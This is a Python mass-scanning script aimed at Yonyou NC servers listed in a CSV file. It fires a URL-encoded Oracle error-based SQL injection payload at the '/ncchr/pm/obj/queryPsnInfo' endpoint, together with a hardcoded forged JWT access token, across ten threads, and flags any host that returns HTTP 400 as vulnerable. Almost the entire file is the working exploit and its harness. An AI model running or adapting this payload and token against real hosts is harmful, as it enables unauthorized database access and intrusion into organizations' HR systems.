from requests.models import Response as Response
from SpiderMan import *
file_path="/root/zichan/用友NC.csv"
class Scan_NC(Scan_base):
    def __init__(self, response: Response, url: str) -> None:
        super().__init__(response, url)
        
    def scans(self)->str:
        if self.response.status_code==400:
            return self.url+"存在漏洞"
        else:
            print("hello world")
        
        
headers={
"User-Agent": "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1",
"Accesstokenncc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ",
"Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
"Connection": "close" 
}
payload="/ncchr/pm/obj/queryPsnInfo?staffid=1%27+AND+1754%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%281754%3D1754%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29--+Nzkh"

def thread_pool2(urls: list, thread_num: int, method: str, data: dict, keys: str = None):  
    results = []  
    with ThreadPoolExecutor(max_workers=thread_num) as executor:  
        if method == 'get':  
            futures = [executor.submit(spider_get, url+payload, headers) for url in urls]  
        elif method == 'post':  
            futures = [executor.submit(spider_post, url, headers, data) for url in urls]  
        for future in as_completed(futures):  
            response, url = future.result()  
            # if response:  
            if keys:  
                scan = Scan_bykeys(response, url)  
                scan_result = scan.scans(keys)  
            else:  
                scan = Scan_NC(response, url)  
                scan_result = scan.scans()  
            # if scan_result:  
                results.append(scan_result)  
                print(scan_result)  
            # else:  
               # print(f"No response for {url}")  
    return results  
      
        
urls=data_deal(file_path)


Scan_results=thread_pool2(urls,10,'get',{})